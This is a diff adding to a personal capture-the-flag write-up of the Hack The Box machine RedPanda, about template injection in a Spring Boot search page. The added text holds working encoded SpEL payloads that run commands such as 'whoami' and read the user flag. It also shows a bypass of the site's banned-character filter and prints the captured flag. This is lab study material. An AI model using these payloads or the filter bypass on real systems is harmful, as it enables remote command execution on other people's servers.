@@ -65,8 +65,7 @@ PORT     STATE SERVICE    VERSION
 |     Date: Sun, 10 Jul 2022 16:45:43 GMT
 |     Connection: close
 |     <!doctype html><html lang="en"><head><title>HTTP Status 400
-|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {fo
-nt-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400
+|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400
 |_    Request</h1></body></html>
 |_http-open-proxy: Proxy might be redirecting requests
 |_http-title: Red Panda Search | Made with Spring Boot
@@ -347,21 +346,127 @@ $ curl http://redpanda.htb:8080/search -X POST --data-raw 'name=#{7*7}'
 injection
 
 
+
+need to figure out what the engine is before continuing to shoot in the dark
+
+### coming back
+
+took down trick this morning, trying to ride that.
+
+still need to identify the engine - searching just "spring boot ssti", the first link is for [https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/](https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/)
+
+this identifies 5 different expression types:
 ```
-$ curl http://redpanda.htb:8080/search -X POST --data-raw 'name=#{{7*7}}'
-
-    <h2 class="searched">You searched for: ??{7*7}_en_US??</h2>
-      <h2>There are 0 results for your search</h2>
-
+${...}: Variable expressions – in practice, these are OGNL or Spring EL expressions.
+*{...}: Selection expressions – similar to variable expressions but used for specific purposes.
+#{...}: Message (i18n) expressions – used for internationalization.
+@{...}: Link (URL) expressions – used to set correct URLs/paths in the application.
+~{...}: Fragment expressions – they let you reuse parts of templates.
 ```
 
-not injection, but modification
+and we can get `*`, `#` and `@` prefixed simple `{8*8}` expressions to work for all of them
+
+
+[https://www.baeldung.com/spring-template-engines](https://www.baeldung.com/spring-template-engines):
+> as well as the main template engines that can be used with Spring: Thymeleaf, Groovy, FreeMarker, Jade.
+
+interesting that didn't mention `Expression Language EL`, because from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection),
+> Expression Language EL - Basic injection
+> ${1+1}
+> #{1+1}
+
+
+wrote [searcher.rb](searcher.rb) and populated with more PATT content in [sstis](sstis)
+
+while playing with `def exploder()`, go to `Jinjava`, which
+
+```
+[38] pry(main)> search("*{{'a'.toUpperCase()}}")
+=> "A"
+```
+
+finally something more powerful than arithmetic
+
+```
+[39] pry(main)> search("*{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}")
+=> {"timestamp"=>"2022-07-17T19:02:16.906+00:00", "status"=>500, "error"=>"Internal Server Error", "message"=>"", "path"=>"/search"}
+[40] pry(main)> search("*{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}")
+=> "xxx"
+```
+
+we're definitely executing java, not javascript, as proven by:
+```
+[81] pry(main)> search("*{{'fooo'.charCodeAt(3)}}")
+=> {"timestamp"=>"2022-07-17T19:19:27.860+00:00", "status"=>500, "error"=>"Internal Server Error", "message"=>"", "path"=>"/search"}
+[82] pry(main)> search("*{{'fooo'.charAt(3)}}")
+=> "o"
+```
+
+`charAt` => Java, `charCodeAt` => JavaScript
+
+
+and finally, get to [https://github.com/VikasVarshney/ssti-payload](https://github.com/VikasVarshney/ssti-payload), which gets us to
+
+```
+[120] pry(main)> search('%24%7BT%28org.apache.commons.io.IOUtils%29.toString%28T%28java.lang.Runtime%29.getRuntime%28%29.exec%28T%28java.lang.Character%29.toString%28119%29.concat%28T%28java.lang.Character%29.toString%28104%29%29.concat%28T%28java.lang.Character%29.toString%28111%29%29.concat%28T%28java.lang.Character%29.toString%2897%29%29.concat%28T%28java.lang.Character%29.toString%28109%29%29.concat%28T%28java.lang.Character%29.toString%28105%29%29%29.getInputStream%28%29%29%7D')
+=> "Error occured: banned characters"
+[121] pry(main)> 0x24.chr
+=> "$"
+[122] pry(main)> '*'.ord.to_s(16)
+=> "2a"
+[123] pry(main)> search('%2A%7BT%28org.apache.commons.io.IOUtils%29.toString%28T%28java.lang.Runtime%29.getRuntime%28%29.exec%28T%28java.lang.Character%29.toString%28119%29.concat%28T%28java.lang.Character%29.toString%28104%29%29.concat%28T%28java.lang.Character%29.toString%28111%29%29.concat%28T%28java.lang.Character%29.toString%2897%29%29.concat%28T%28java.lang.Character%29.toString%28109%29%29.concat%28T%28java.lang.Character%29.toString%28105%29%29%29.getInputStream%28%29%29%7D')
+
+From: /home/conor/git/ctf-meta/htb/machines/03-RedPanda/searcher.rb:32 Object#search:
+
+    16: def search(term)
+    17:   uri = URI.parse(BASE_URL)
+    18:
+    19:   http = Net::HTTP.new(uri.host, uri.port)
+    20:
+    21:   request = Net::HTTP::Post.new(uri.request_uri)
+    22:   request.body = sprintf('name=%s', term)
+    23:   request['Content-Type'] = 'application/x-www-form-urlencoded'
+    24:
+    25:   response = http.request(request)
+    26:
+    27:   if response.code.eql?('200')
+    28:     if response.body.match(RESPONSE_MATCHER)
+    29:       return $1
+    30:     end
+    31:
+ => 32:     binding.pry
+    33:   else
+    34:     return JSON.parse(response.body)
+    35:   end
+    36:
+    37:   binding.pry
+    38: end
+
+[1] pry(main)> response.body
+=> "<!DOCTYPE html>\n<html lang=\"en\" dir=\"ltr\">\n  <head>\n    <meta charset=\"utf-8\">\n    <title>Red Panda Search | Made with Spring Boot</title>\n    <link rel=\"stylesheet\" href=\"css/search.css\">\n  </head>\n  <body>\n    <form action=\"/search\" method=\"POST\">\n    <div class=\"wrap\">\n      <div class=\"search\">\n        <input type=\"text\" name=\"name\" placeholder=\"Search for a red panda\">\n        <button type=\"submit\" class=\"searchButton\">\n          <i class=\"fa fa-search\"></i>\n        </button>\n      </div>\n    </div>\n  </form>\n    <div class=\"wrapper\">\n  <div class=\"results\">\n    <h2 class=\"searched\">You searched for: woodenk\n</h2>\n      <h2>There are 0 results for your search</h2>\n       \n    </div>\n    </div>\n    \n  </body>\n</html>\n"
+```
+
+output that matters `You searched for: woodenk\n`, this was an encoded `whoami` command
+
+```
+$ python ssti-payload.py -u
+Command ==> cat /home/woodenk/user.txt
+
+%24%7BT%28org.apache.commons.io.IOUtils%29.toString%28T%28java.lang.Runtime%29.getRuntime%28%29.exec%28T%28java.lang.Character%29.toString%2899%29.concat%28T%28java.lang.Character%29.toString%2897%29%29.concat%28T%28java.lang.Character%29.toString%28116%29%29.concat%28T%28java.lang.Character%29.toString%2832%29%29.concat%28T%28java.lang.Character%29.toString%2847%29%29.concat%28T%28java.lang.Character%29.toString%28104%29%29.concat%28T%28java.lang.Character%29.toString%28111%29%29.concat%28T%28java.lang.Character%29.toString%28109%29%29.concat%28T%28java.lang.Character%29.toString%28101%29%29.concat%28T%28java.lang.Character%29.toString%2847%29%29.concat%28T%28java.lang.Character%29.toString%28119%29%29.concat%28T%28java.lang.Character%29.toString%28111%29%29.concat%28T%28java.lang.Character%29.toString%28111%29%29.concat%28T%28java.lang.Character%29.toString%28100%29%29.concat%28T%28java.lang.Character%29.toString%28101%29%29.concat%28T%28java.lang.Character%29.toString%28110%29%29.concat%28T%28java.lang.Character%29.toString%28107%29%29.concat%28T%28java.lang.Character%29.toString%2847%29%29.concat%28T%28java.lang.Character%29.toString%28117%29%29.concat%28T%28java.lang.Character%29.toString%28115%29%29.concat%28T%28java.lang.Character%29.toString%28101%29%29.concat%28T%28java.lang.Character%29.toString%28114%29%29.concat%28T%28java.lang.Character%29.toString%2846%29%29.concat%28T%28java.lang.Character%29.toString%28116%29%29.concat%28T%28java.lang.Character%29.toString%28120%29%29.concat%28T%28java.lang.Character%29.toString%28116%29%29%29.getInputStream%28%29%29%7D
+```
+
+which gets us to..
+
+`<h2 class="searched">You searched for: 324c9fbcbc65d4032c4bda715a4955dc`
+
+awwwwwww yeah.
+
 
 
 
 ## flag
 
 ```
-user:
+user:324c9fbcbc65d4032c4bda715a4955dc
 root:
 ```
